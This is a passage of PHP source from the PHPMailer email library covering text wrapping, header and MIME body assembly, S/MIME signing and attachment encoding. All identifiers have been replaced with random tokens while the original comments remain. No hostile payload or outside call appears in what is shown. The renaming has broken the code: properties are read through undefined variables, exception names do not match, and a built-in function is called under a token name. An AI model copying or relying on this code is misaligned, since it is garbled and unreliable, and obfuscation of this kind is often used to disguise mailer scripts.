and(strlen($ynze_3287381265)>$ipnw_25009842)){$xjrt_286367202=$ipnw_25009842-strlen($iidz_1116442498)-$udba_3491428006;if(!$odjr_510788991){if($xjrt_286367202>20){$jvib_202127595=$xjrt_286367202;if($xwjm_2685080992){$jvib_202127595=$this->zxxi_57755973($ynze_3287381265,$jvib_202127595);}elseif(substr($ynze_3287381265,$jvib_202127595-1,1)=='='){$jvib_202127595--;}elseif(substr($ynze_3287381265,$jvib_202127595-2,1)=='='){$jvib_202127595-=2;}$rzof_1225748678=substr($ynze_3287381265,0,$jvib_202127595);$ynze_3287381265=substr($ynze_3287381265,$jvib_202127595);$iidz_1116442498.=' '.$rzof_1225748678;$rxna_3065852031.=$iidz_1116442498.sprintf('=%s',self::CRLF);}else{$rxna_3065852031.=$iidz_1116442498.$emft_1141594233;}$iidz_1116442498='';}while(strlen($ynze_3287381265)>0){if($ipnw_25009842<=0){break;}$jvib_202127595=$ipnw_25009842;if($xwjm_2685080992){$jvib_202127595=$this->zxxi_57755973($ynze_3287381265,$jvib_202127595);}elseif(substr($ynze_3287381265,$jvib_202127595-1,1)=='='){$jvib_202127595--;}elseif(substr($ynze_3287381265,$jvib_202127595-2,1)=='='){$jvib_202127595-=2;}$rzof_1225748678=substr($ynze_3287381265,0,$jvib_202127595);$ynze_3287381265=substr($ynze_3287381265,$jvib_202127595);if(strlen($ynze_3287381265)>0){$rxna_3065852031.=$rzof_1225748678.sprintf('=%s',self::CRLF);}else{$iidz_1116442498=$rzof_1225748678;}}}else{$otaj_3578071390=$iidz_1116442498;if(!$odjr_510788991){$iidz_1116442498.=' ';}$iidz_1116442498.=$ynze_3287381265;if(strlen($iidz_1116442498)>$ipnw_25009842 and $otaj_3578071390!=''){$rxna_3065852031.=$otaj_3578071390.$emft_1141594233;$iidz_1116442498=$ynze_3287381265;}}$odjr_510788991=false;}$rxna_3065852031.=$iidz_1116442498.self::CRLF;}return $rxna_3065852031;}/**
     * Find the last character boundary prior to $maxLength in a utf-8
     * quoted-printable encoded string.
     * Original written by Colin Brown.
     * @access public
     * @param string $encodedText utf-8 QP text
     * @param integer $maxLength Find the last character boundary prior to this length
     * @return integer
     */ public function zxxi_57755973($lgpa_411058260,$fxgu_1072723475){$ogvu_3308067364=false;$ljvt_1684020311=3;while(!$ogvu_3308067364){$yfla_2680810093=substr($lgpa_411058260,$fxgu_1072723475-$ljvt_1684020311,$ljvt_1684020311);$udgt_2560422316=strpos($yfla_2680810093,'=');if(false!==$udgt_2560422316){$uhru_4291896678=substr($lgpa_411058260,$fxgu_1072723475-$ljvt_1684020311+$udgt_2560422316+1,2);$zcfu_2091783662=hexdec($uhru_4291896678);if($zcfu_2091783662<128){if($udgt_2560422316>0){$fxgu_1072723475=$fxgu_1072723475-($ljvt_1684020311-$udgt_2560422316);}$ogvu_3308067364=true;}elseif($zcfu_2091783662>=192){$fxgu_1072723475=$fxgu_1072723475-($ljvt_1684020311-$udgt_2560422316);$ogvu_3308067364=true;}elseif($zcfu_2091783662<192){$ljvt_1684020311+=3;}}else{$ogvu_3308067364=true;}}return $fxgu_1072723475;}/**
     * Apply word wrapping to the message body.
     * Wraps the message body to the number of chars set in the WordWrap property.
     * You should only do this to plain-text bodies as wrapping HTML tags may break them.
     * This is called automatically by createBody(), so you don't need to call it yourself.
     * @access public
     * @return void
     */ public function ogib_3016737688(){if($this->$cayp_3884334794<1){return;}switch($this->$nrxi_2212812437){case 'alt':case 'alt_inline':case 'alt_attach':case 'alt_inline_attach':$this->$qbaw_2558022429=$this->dbmk_952593719($this->$qbaw_2558022429,$this->$cayp_3884334794);break;default:$this->$lhgl_2491560500=$this->dbmk_952593719($this->$lhgl_2491560500,$this->$cayp_3884334794);break;}}/**
     * Assemble message headers.
     * @access public
     * @return string The assembled headers
     */ public function lnat_3607705866(){$xkdg_325763347='';$xkdg_325763347.=$this->qlvg_3753888088('Date',$this->$lgxm_2109671927==''?self::aake_3444357374():$this->$lgxm_2109671927);if($this->$ltap_2795026134){if($this->$okms_3272781023!='mail'){foreach($this->$iocy_252678980 as $svtj_1238188993){$this->$nvdx_1430038571[]=$this->jegf_2611113625($svtj_1238188993);}}}else{if(count($this->$iocy_252678980)>0){if($this->$okms_3272781023!='mail'){$xkdg_325763347.=$this->tyec_1512229866('To',$this->$iocy_252678980);}}elseif(count($this->$isnj_112844655)==0){$xkdg_325763347.=$this->qlvg_3753888088('To','undisclosed-recipients:;');}}$xkdg_325763347.=$this->tyec_1512229866('From',array(array(trim($this->$qxvc_2035421089),$this->$krwg_2714639915)));if(count($this->$isnj_112844655)>0){$xkdg_325763347.=$this->tyec_1512229866('Cc',$this->$isnj_112844655);}if(($this->$okms_3272781023=='sendmail' or $this->$okms_3272781023=='qmail' or $this->$okms_3272781023=='mail')and count($this->$givi_3685882489)>0){$xkdg_325763347.=$this->tyec_1512229866('Bcc',$this->$givi_3685882489);}if(count($this->$ojew_958603384)>0){$xkdg_325763347.=$this->tyec_1512229866('Reply-To',$this->$ojew_958603384);}if($this->$okms_3272781023!='mail'){$xkdg_325763347.=$this->qlvg_3753888088('Subject',$this->nsvw_633294872($this->xdha_1719758595($this->$uash_182487569)));}if(''!=$this->$acin_2980719910 and preg_match('/^<.*@.*>$/',$this->$acin_2980719910)){$this->$bcpp_2870337799=$this->$acin_2980719910;}else{$this->$bcpp_2870337799=sprintf('<%s@%s>',$this->$tdke_1102140385,$this->bavi_437344390());}$xkdg_325763347.=$this->qlvg_3753888088('Message-ID',$this->$bcpp_2870337799);if(!is_null($this->$cjnl_918048160)){$xkdg_325763347.=$this->qlvg_3753888088('X-Priority',$this->$cjnl_918048160);}if($this->$xcmw_120906707==''){$xkdg_325763347.=$this->qlvg_3753888088('X-Mailer','PHPMailer '.$this->$oryy_470435855.' (https://github.com/PHPMailer/PHPMailer)');}else{$okvz_1499076720=trim($this->$xcmw_120906707);if($okvz_1499076720){$xkdg_325763347.=$this->qlvg_3753888088('X-Mailer',$okvz_1499076720);}}if($this->$ybdf_1678445018!=''){$xkdg_325763347.=$this->qlvg_3753888088('Disposition-Notification-To','<'.$this->$ybdf_1678445018.'>');}foreach($this->$jwzy_1869967481 as $iinp_1853008065){$xkdg_325763347.=$this->qlvg_3753888088(trim($iinp_1853008065[0]),$this->nsvw_633294872(trim($iinp_1853008065[1])));}if(!$this->$ldbd_3133053849){$xkdg_325763347.=$this->qlvg_3753888088('MIME-Version','1.0');$xkdg_325763347.=$this->iidy_836602353();}return $xkdg_325763347;}/**
     * Get the message MIME type headers.
     * @access public
     * @return string
     */ public function iidy_836602353(){$xkdg_325763347='';$rnuk_875564397=true;switch($this->$nrxi_2212812437){case 'inline':$xkdg_325763347.=$this->qlvg_3753888088('Content-Type','multipart/related;');$xkdg_325763347.=$this->yqoz_804728374("\tboundary=\"".$this->$nvhj_1425974659[1].'"');break;case 'attach':case 'inline_attach':case 'alt_attach':case 'alt_inline_attach':$xkdg_325763347.=$this->qlvg_3753888088('Content-Type','multipart/mixed;');$xkdg_325763347.=$this->yqoz_804728374("\tboundary=\"".$this->$nvhj_1425974659[1].'"');break;case 'alt':case 'alt_inline':$xkdg_325763347.=$this->qlvg_3753888088('Content-Type','multipart/alternative;');$xkdg_325763347.=$this->yqoz_804728374("\tboundary=\"".$this->$nvhj_1425974659[1].'"');break;default:$xkdg_325763347.=$this->yqoz_804728374('Content-Type: '.$this->$bsce_2505547451.'; charset='.$this->$xekg_286892112);$rnuk_875564397=false;break;}if($this->$nrqf_135092103!='7bit'){if($rnuk_875564397){if($this->$nrqf_135092103=='8bit'){$xkdg_325763347.=$this->qlvg_3753888088('Content-Transfer-Encoding','8bit');}}else{$xkdg_325763347.=$this->qlvg_3753888088('Content-Transfer-Encoding',$this->$nrqf_135092103);}}if($this->$okms_3272781023!='mail'){$xkdg_325763347.=$this->$apvs_3568589458;}return $xkdg_325763347;}/**
     * Returns the whole MIME message.
     * Includes complete headers and body.
     * Only valid post preSend().
     * @see PHPMailer::preSend()
     * @access public
     * @return string
     */ public function ucnk_2090781897(){return rtrim($this->$chyd_3901694020.$this->$rfxt_4139716636,"\n\r").self::CRLF.self::CRLF.$this->$ormt_905206479;}/**
     * Create unique ID
     * @return string
     */ protected function riaz_4181196645(){return md5(uniqid(time()));}/**
     * Assemble the message body.
     * Returns an empty string on failure.
     * @access public
     * @throws phpmailerException
     * @return string The assembled message body
     */ public function vkyp_695867810(){$ssxo_3685223346='';$this->$tdke_1102140385=$this->riaz_4181196645();$this->$nvhj_1425974659[1]='b1_'.$this->$tdke_1102140385;$this->$nvhj_1425974659[2]='b2_'.$this->$tdke_1102140385;$this->$nvhj_1425974659[3]='b3_'.$this->$tdke_1102140385;if($this->$ldbd_3133053849){$ssxo_3685223346.=$this->iidy_836602353().$this->$apvs_3568589458;}$this->ogib_3016737688();$cdlf_209765362=$this->$nrqf_135092103;$wptf_612103660=$this->$xekg_286892112;if($cdlf_209765362=='8bit' and!$this->qarp_751062919($this->$lhgl_2491560500)){$cdlf_209765362='7bit';$wptf_612103660='us-ascii';}if('base64'!=$this->$nrqf_135092103 and self::hjyt_198759551($this->$lhgl_2491560500)){$cdlf_209765362='quoted-printable';}$zhsg_2669104031=$this->$nrqf_135092103;$foon_3121349985=$this->$xekg_286892112;if($zhsg_2669104031=='8bit' and!$this->qarp_751062919($this->$qbaw_2558022429)){$zhsg_2669104031='7bit';$foon_3121349985='us-ascii';}if('base64'!=$zhsg_2669104031 and self::hjyt_198759551($this->$qbaw_2558022429)){$zhsg_2669104031='quoted-printable';}$wbau_1099759351="This is a multi-part message in MIME format.".$this->$apvs_3568589458.$this->$apvs_3568589458;switch($this->$nrxi_2212812437){case 'inline':$ssxo_3685223346.=$wbau_1099759351;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[1],$wptf_612103660,'',$cdlf_209765362);$ssxo_3685223346.=$this->derc_3581102704($this->$lhgl_2491560500,$cdlf_209765362);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->xbsj_2190478010('inline',$this->$nvhj_1425974659[1]);break;case 'attach':$ssxo_3685223346.=$wbau_1099759351;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[1],$wptf_612103660,'',$cdlf_209765362);$ssxo_3685223346.=$this->derc_3581102704($this->$lhgl_2491560500,$cdlf_209765362);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->xbsj_2190478010('attachment',$this->$nvhj_1425974659[1]);break;case 'inline_attach':$ssxo_3685223346.=$wbau_1099759351;$ssxo_3685223346.=$this->yqoz_804728374('--'.$this->$nvhj_1425974659[1]);$ssxo_3685223346.=$this->qlvg_3753888088('Content-Type','multipart/related;');$ssxo_3685223346.=$this->yqoz_804728374("\tboundary=\"".$this->$nvhj_1425974659[2].'"');$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[2],$wptf_612103660,'',$cdlf_209765362);$ssxo_3685223346.=$this->derc_3581102704($this->$lhgl_2491560500,$cdlf_209765362);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->xbsj_2190478010('inline',$this->$nvhj_1425974659[2]);$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->xbsj_2190478010('attachment',$this->$nvhj_1425974659[1]);break;case 'alt':$ssxo_3685223346.=$wbau_1099759351;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[1],$foon_3121349985,'text/plain',$zhsg_2669104031);$ssxo_3685223346.=$this->derc_3581102704($this->$qbaw_2558022429,$zhsg_2669104031);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[1],$wptf_612103660,'text/html',$cdlf_209765362);$ssxo_3685223346.=$this->derc_3581102704($this->$lhgl_2491560500,$cdlf_209765362);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;if(!empty($this->$dtcl_2368920574)){$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[1],'','text/calendar; method=REQUEST','');$ssxo_3685223346.=$this->derc_3581102704($this->$dtcl_2368920574,$this->$nrqf_135092103);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;}$ssxo_3685223346.=$this->ecbt_646959248($this->$nvhj_1425974659[1]);break;case 'alt_inline':$ssxo_3685223346.=$wbau_1099759351;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[1],$foon_3121349985,'text/plain',$zhsg_2669104031);$ssxo_3685223346.=$this->derc_3581102704($this->$qbaw_2558022429,$zhsg_2669104031);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->yqoz_804728374('--'.$this->$nvhj_1425974659[1]);$ssxo_3685223346.=$this->qlvg_3753888088('Content-Type','multipart/related;');$ssxo_3685223346.=$this->yqoz_804728374("\tboundary=\"".$this->$nvhj_1425974659[2].'"');$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[2],$wptf_612103660,'text/html',$cdlf_209765362);$ssxo_3685223346.=$this->derc_3581102704($this->$lhgl_2491560500,$cdlf_209765362);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->xbsj_2190478010('inline',$this->$nvhj_1425974659[2]);$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->ecbt_646959248($this->$nvhj_1425974659[1]);break;case 'alt_attach':$ssxo_3685223346.=$wbau_1099759351;$ssxo_3685223346.=$this->yqoz_804728374('--'.$this->$nvhj_1425974659[1]);$ssxo_3685223346.=$this->qlvg_3753888088('Content-Type','multipart/alternative;');$ssxo_3685223346.=$this->yqoz_804728374("\tboundary=\"".$this->$nvhj_1425974659[2].'"');$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[2],$foon_3121349985,'text/plain',$zhsg_2669104031);$ssxo_3685223346.=$this->derc_3581102704($this->$qbaw_2558022429,$zhsg_2669104031);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[2],$wptf_612103660,'text/html',$cdlf_209765362);$ssxo_3685223346.=$this->derc_3581102704($this->$lhgl_2491560500,$cdlf_209765362);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->ecbt_646959248($this->$nvhj_1425974659[2]);$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->xbsj_2190478010('attachment',$this->$nvhj_1425974659[1]);break;case 'alt_inline_attach':$ssxo_3685223346.=$wbau_1099759351;$ssxo_3685223346.=$this->yqoz_804728374('--'.$this->$nvhj_1425974659[1]);$ssxo_3685223346.=$this->qlvg_3753888088('Content-Type','multipart/alternative;');$ssxo_3685223346.=$this->yqoz_804728374("\tboundary=\"".$this->$nvhj_1425974659[2].'"');$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[2],$foon_3121349985,'text/plain',$zhsg_2669104031);$ssxo_3685223346.=$this->derc_3581102704($this->$qbaw_2558022429,$zhsg_2669104031);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->yqoz_804728374('--'.$this->$nvhj_1425974659[2]);$ssxo_3685223346.=$this->qlvg_3753888088('Content-Type','multipart/related;');$ssxo_3685223346.=$this->yqoz_804728374("\tboundary=\"".$this->$nvhj_1425974659[3].'"');$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->gkkr_717476055($this->$nvhj_1425974659[3],$wptf_612103660,'text/html',$cdlf_209765362);$ssxo_3685223346.=$this->derc_3581102704($this->$lhgl_2491560500,$cdlf_209765362);$ssxo_3685223346.=$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346.=$this->xbsj_2190478010('inline',$this->$nvhj_1425974659[3]);$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->ecbt_646959248($this->$nvhj_1425974659[2]);$ssxo_3685223346.=$this->$apvs_3568589458;$ssxo_3685223346.=$this->xbsj_2190478010('attachment',$this->$nvhj_1425974659[1]);break;default:$this->$nrqf_135092103=$cdlf_209765362;$ssxo_3685223346.=$this->derc_3581102704($this->$lhgl_2491560500,$this->$nrqf_135092103);break;}if($this->netp_1422576975()){$ssxo_3685223346='';}elseif($this->$ldbd_3133053849){try{if(!defined('PKCS7_TEXT')){throw new gpmm_657600444($this->zhkz_822707298('extension_missing').'openssl');}$qskv_2359244304=tempnam(sys_get_temp_dir(),'mail');if(false===file_put_contents($qskv_2359244304,$ssxo_3685223346)){throw new gpmm_657600444($this->zhkz_822707298('signing').' Could not write temp file');}$ttbv_515627203=tempnam(sys_get_temp_dir(),'signed');if(empty($this->$ozbi_3605122514)){$inwh_2675872254=@openssl_pkcs7_sign($qskv_2359244304,$ttbv_515627203,'file://'.realpath($this->$ptyv_2438750005),array('file://'.realpath($this->$ldbd_3133053849),$this->$fdrg_4166089133),null);}else{$inwh_2675872254=@openssl_pkcs7_sign($qskv_2359244304,$ttbv_515627203,'file://'.realpath($this->$ptyv_2438750005),array('file://'.realpath($this->$ldbd_3133053849),$this->$fdrg_4166089133),null,PKCS7_DETACHED,$this->$ozbi_3605122514);}if($inwh_2675872254){@unlink($qskv_2359244304);$ssxo_3685223346=file_get_contents($ttbv_515627203);@unlink($ttbv_515627203);$voku_1765844990=explode("\n\n",$ssxo_3685223346,2);$this->$chyd_3901694020.=$voku_1765844990[0].$this->$apvs_3568589458.$this->$apvs_3568589458;$ssxo_3685223346=$voku_1765844990[1];}else{@unlink($qskv_2359244304);@unlink($ttbv_515627203);throw new gpmm_657600444($this->zhkz_822707298('signing').openssl_error_string());}}catch(phpmailerException $ptmu_2181043141){$ssxo_3685223346='';if($this->$cdmv_440379532){throw $ptmu_2181043141;}}}return $ssxo_3685223346;}/**
     * Return the start of a message boundary.
     * @access protected
     * @param string $boundary
     * @param string $charSet
     * @param string $contentType
     * @param string $encoding
     * @return string
     */ protected function gkkr_717476055($vnhb_1048445522,$hdjq_2280229109,$fjup_3563894552,$jacn_1749612879){$xkdg_325763347='';if($hdjq_2280229109==''){$hdjq_2280229109=$this->$xekg_286892112;}if($fjup_3563894552==''){$fjup_3563894552=$this->$bsce_2505547451;}if($jacn_1749612879==''){$jacn_1749612879=$this->$nrqf_135092103;}$xkdg_325763347.=$this->yqoz_804728374('--'.$vnhb_1048445522);$xkdg_325763347.=sprintf('Content-Type: %s; charset=%s',$fjup_3563894552,$hdjq_2280229109);$xkdg_325763347.=$this->$apvs_3568589458;if($jacn_1749612879!='7bit'){$xkdg_325763347.=$this->qlvg_3753888088('Content-Transfer-Encoding',$jacn_1749612879);}$xkdg_325763347.=$this->$apvs_3568589458;return $xkdg_325763347;}/**
     * Return the end of a message boundary.
     * @access protected
     * @param string $boundary
     * @return string
     */ protected function ecbt_646959248($vnhb_1048445522){return $this->$apvs_3568589458.'--'.$vnhb_1048445522.'--'.$this->$apvs_3568589458;}/**
     * Set the message type.
     * PHPMailer only supports some preset message types, not arbitrary MIME structures.
     * @access protected
     * @return void
     */ protected function lxwn_3599526309(){$ouxh_2363381545=array();if($this->flzu_354580856()){$ouxh_2363381545[]='alt';}if($this->oucp_1720597842()){$ouxh_2363381545[]='inline';}if($this->swvn_2308297011()){$ouxh_2363381545[]='attach';}$this->$nrxi_2212812437=implode('_',$ouxh_2363381545);if($this->$nrxi_2212812437==''){$this->$nrxi_2212812437='plain';}}/**
     * Format a header line.
     * @access public
     * @param string $name
     * @param string $value
     * @return string
     */ public function qlvg_3753888088($rxlv_1579384326,$vmpv_494360628){return $rxlv_1579384326.': '.$vmpv_494360628.$this->$apvs_3568589458;}/**
     * Return a formatted mail line.
     * @access public
     * @param string $value
     * @return string
     */ public function yqoz_804728374($vmpv_494360628){return $vmpv_494360628.$this->$apvs_3568589458;}/**
     * Add an attachment from a path on the filesystem.
     * Never use a user-supplied path to a file!
     * Returns false if the file could not be found or read.
     * Explicitly *does not* support passing URLs; PHPMailer is not an HTTP client.
     * If you need to do that, fetch the resource yourself and pass it in via a local file or string.
     * @param string $path Path to the attachment.
     * @param string $name Overrides the attachment name.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File extension (MIME) type.
     * @param string $disposition Disposition to use
     * @throws phpmailerException
     * @return boolean
     */ public function vpry_3267380617($vroo_190089999,$rxlv_1579384326='',$jacn_1749612879='base64',$ouxh_2363381545='',$phpv_1280884576='attachment'){try{if(!self::ulfd_820602762($vroo_190089999)or!@is_file($vroo_190089999)){throw new gpmm_657600444($this->zhkz_822707298('file_access').$vroo_190089999,self::STOP_CONTINUE);}if($ouxh_2363381545==''){$ouxh_2363381545=self::lelz_3080359015($vroo_190089999);}$zcgn_1007413605=basename($vroo_190089999);if($rxlv_1579384326==''){$rxlv_1579384326=$zcgn_1007413605;}$this->$mafg_1123666477[]=array(0=>$vroo_190089999,1=>$zcgn_1007413605,2=>$rxlv_1579384326,3=>$jacn_1749612879,4=>$ouxh_2363381545,5=>false,6=>$phpv_1280884576,7=>0);}catch(phpmailerException $ptmu_2181043141){$this->atvy_1425932775($ptmu_2181043141->pmnj_171178595());$this->thqc_1132236784($ptmu_2181043141->pmnj_171178595());if($this->$cdmv_440379532){throw $ptmu_2181043141;}return false;}return true;}/**
     * Return the array of attachments.
     * @return array
     */ public function ahsr_2799979269(){return $this->$mafg_1123666477;}/**
     * Attach all file, string, and binary attachments to the message.
     * Returns an empty string on failure.
     * @access protected
     * @param string $disposition_type
     * @param string $boundary
     * @return string
     */ protected function xbsj_2190478010($plil_867922354,$vnhb_1048445522){$ucse_1116045392=array();$febs_1239191271=array();$qtcy_804754600=array();foreach($this->$mafg_1123666477 as $pqur_2036324795){if($pqur_2036324795[6]==$plil_867922354){$kdvd_2663297705='';$vroo_190089999='';$hanp_2845152398=$pqur_2036324795[5];if($hanp_2845152398){$kdvd_2663297705=$pqur_2036324795[0];}else{$vroo_190089999=$pqur_2036324795[0];}$xktv_1397819741=md5(serialize($pqur_2036324795));if(in_array($xktv_1397819741,$qtcy_804754600)){continue;}$qtcy_804754600[]=$xktv_1397819741;$rxlv_1579384326=$pqur_2036324795[2];$jacn_1749612879=$pqur_2036324795[3];$ouxh_2363381545=$pqur_2036324795[4];$phpv_1280884576=$pqur_2036324795[6];$cxto_1261492676=$pqur_2036324795[7];if($phpv_1280884576=='inline'&&array_key_exists($cxto_1261492676,$febs_1239191271)){continue;}$febs_1239191271[$cxto_1261492676]=true;$ucse_1116045392[]=sprintf('--%s%s',$vnhb_1048445522,$this->$apvs_3568589458);if(!empty($rxlv_1579384326)){$ucse_1116045392[]=sprintf('Content-Type: %s; name="%s"%s',$ouxh_2363381545,$this->nsvw_633294872($this->xdha_1719758595($rxlv_1579384326)),$this->$apvs_3568589458);}else{$ucse_1116045392[]=sprintf('Content-Type: %s%s',$ouxh_2363381545,$this->$apvs_3568589458);}if($jacn_1749612879!='7bit'){$ucse_1116045392[]=sprintf('Content-Transfer-Encoding: %s%s',$jacn_1749612879,$this->$apvs_3568589458);}if($phpv_1280884576=='inline'){$ucse_1116045392[]=sprintf('Content-ID: <%s>%s',$cxto_1261492676,$this->$apvs_3568589458);}if(!(empty($phpv_1280884576))){$gefy_2883774464=$this->nsvw_633294872($this->xdha_1719758595($rxlv_1579384326));if(preg_match('/[ \(\)<>@,;:\\"\/\[\]\?=]/',$gefy_2883774464)){$ucse_1116045392[]=sprintf('Content-Disposition: %s; filename="%s"%s',$phpv_1280884576,$gefy_2883774464,$this->$apvs_3568589458.$this->$apvs_3568589458);}else{if(!empty($gefy_2883774464)){$ucse_1116045392[]=sprintf('Content-Disposition: %s; filename=%s%s',$phpv_1280884576,$gefy_2883774464,$this->$apvs_3568589458.$this->$apvs_3568589458);}else{$ucse_1116045392[]=sprintf('Content-Disposition: %s%s',$phpv_1280884576,$this->$apvs_3568589458.$this->$apvs_3568589458);}}}else{$ucse_1116045392[]=$this->$apvs_3568589458;}if($hanp_2845152398){$ucse_1116045392[]=$this->derc_3581102704($kdvd_2663297705,$jacn_1749612879);if($this->netp_1422576975()){return '';}$ucse_1116045392[]=$this->$apvs_3568589458.$this->$apvs_3568589458;}else{$ucse_1116045392[]=$this->unor_2887882083($vroo_190089999,$jacn_1749612879);if($this->netp_1422576975()){return '';}$ucse_1116045392[]=$this->$apvs_3568589458.$this->$apvs_3568589458;}}}$ucse_1116045392[]=sprintf('--%s--%s',$vnhb_1048445522,$this->$apvs_3568589458);return implode('',$ucse_1116045392);}/**
     * Encode a file attachment in requested format.
     * Returns an empty string on failure.
     * @param string $path The full path to the file
     * @param string $encoding The encoding to use; one of 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
     * @throws phpmailerException
     * @access protected
     * @return string
     */ protected function unor_2887882083($vroo_190089999,$jacn_1749612879='base64'){try{if(!self::ulfd_820602762($vroo_190089999)or!file_exists($vroo_190089999)){throw new gpmm_657600444($this->zhkz_822707298('file_open').$vroo_190089999,self::STOP_CONTINUE);}$wtmb_67624423=false;if(version_compare(PHP_VERSION,'7.4.0','<')){$wtmb_67624423=get_magic_quotes_runtime();}if($wtmb_67624423){if(version_compare(PHP_VERSION,'5.3.0','<')){lbwj_2174111853(false);}else{ini_set('magic_quotes_runtime',false);}}$wdpx_2303579725=file_get_contents($vroo_190089999);$wdpx_2303579725=$this->derc_3581102704($wdpx_2303579725,$jacn_1749612879);if($wtmb_67624423){if(version_compare(PHP_VERSION,'5.3.0','<')){lbwj_2174111853($wtmb_67624423);}else{ini_set('magic_quotes_runtime',$wtmb_67624423);}}return $wdpx_2303579725;}catch(Exception $ptmu_2181043141){$this->atvy_1425932775($ptmu_2181043141->pmnj_171178595());return '';}}/**
     * Encode a string in requested format.
     * Returns an empty string on failure.
     * @param string $str The text to encode
     * @param string $encoding The encoding to use; one of 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
     * @access public
     * @return string
     */ public function derc_3581102704($mkrn_1554949113,$jacn_1749612879='base64'){$xxpv_3594543489='';switch(strtolower($jacn_1749612879)){case 'base64':$xxpv_3594543489=chunk_split(base64_encode($mkrn_1554949113),76,$this->$apvs_3568589458);break;case '7bit':case '8bit':$xxpv_3594543489=$this->iwdw_723304945($mkrn_1554949113);if(substr($xxpv_3594543489,-(strlen($this->$apvs_3568589458)))!=$this->$apvs_3568589458){$xxpv_3594543489.=$this->$apvs_3568589458;}break;case 'binary':$xxpv_3594543489=$mkrn_1554949113;break;case 'quoted-printable':$xxpv_3594543489=$this->xdlh_2167508760($mkrn_1554949113);break;default:$this->atvy_1425932775($this->zhkz_822707298('encoding').$jacn_1749612879);break;}return $xxpv_3594543489;}/**
     * Encode a header string optimally.
     * Picks shortest of Q, B, quoted-printable or none.
     * @access public
     * @param string $str
     * @param string $position
     * @return string
     */ public function nsvw_633294872($mkrn_1554949113,$dbso_1177347317='text'){$wuyf_3113452811=0;switch(strtolower($dbso_1177347317)){case 'phrase':if(!preg_match('/[\200-\377]/',$mkrn_1554949113)){$xxpv_3594543489=addcslashes($mkrn_1554949113,"\0..\37\177\\\"");if(($mkrn_1554949113==$xxpv_3594543489)&&!preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/',$mkrn_1554949113)){return($xxpv_3594543489);}else{return("\"$xxpv_3594543489\"");}}$wuyf_3113452811=preg_match_all('/[^\040\041\043-\133\135-\176]/',$mkrn_1554949113,$wzpa_103159226);break;/** @noinspection PhpMissingBreakStatementInspection */ case 'comment':$wuyf_3113452811=preg_match_all('/[()"]/',$mkrn_1554949113,$wzpa_103159226);case 'text':default:$wuyf_3113452811+=preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/',$mkrn_1554949113,$wzpa_103159226);break;}if($wuyf_3113452811==0){return($mkrn_1554949113);}$nolk_4231826000=75-7-strlen($this->$xekg_286892112);if($wuyf_3113452811>strlen($mkrn_1554949113)/3){$jacn_1749612879='B';if(function_exists('mb_strlen')&&$this->hrky_1478612263($mkrn_1554949113)){$xxpv_3594543489=$this->kapp_1681172242($mkrn_1554949113,"\n");}else{$xxpv_3594543489=base64_encode($mkrn_1554949113);$nolk_4231826000-=$nolk_4231826000%4;$xxpv_3594543489=trim(chunk_split($xxpv_3594543489,$nolk_4231826000,"\n"));}}else{$jacn_1749612879='Q';$xxpv_3594543489=$this->qxni_2163451298($mkrn_1554949113,$dbso_1177347317);$xxpv_3594543489=$this->dbmk_952593719($xxpv_3594543489,$nolk_4231826000,true);$xxpv_3594543489=str_replace('='.self::CRLF,"\n",trim($xxpv_3594543489));}$xxpv_3594543489=preg_replace('/^(.*)$/m',' =?'.$this->$xekg_286892112."?$jacn_1749612879?\\1?=",$xxpv_3594543489);$xxpv_3594543489=trim(str_replace("\n",$this->$apvs_3568589458,$xxpv_3594543489));return $xxpv_3594543489;}/**
     * Check if a string contains multi-byte characters.
     * @access public
     * @param string $str multi-byte text to wrap encode
     * @return boolean
     */ public function hrky_1478612263($mkrn_1554949113){if(function_exists('mb_strlen')){return(strlen($mkrn_1554949113)>mb_strlen($mkrn_1554949113,$this->$xekg_286892112));}else{return false;}}/**
     * Does a string contain any 8-bit chars (in any charset)?
     * @param string $text
     * @return boolean
     */ public function qarp_751062919($zlct_999008199){return(boolean)preg_match('/[\x80-\xFF]/',$zlct_999008199);}/**
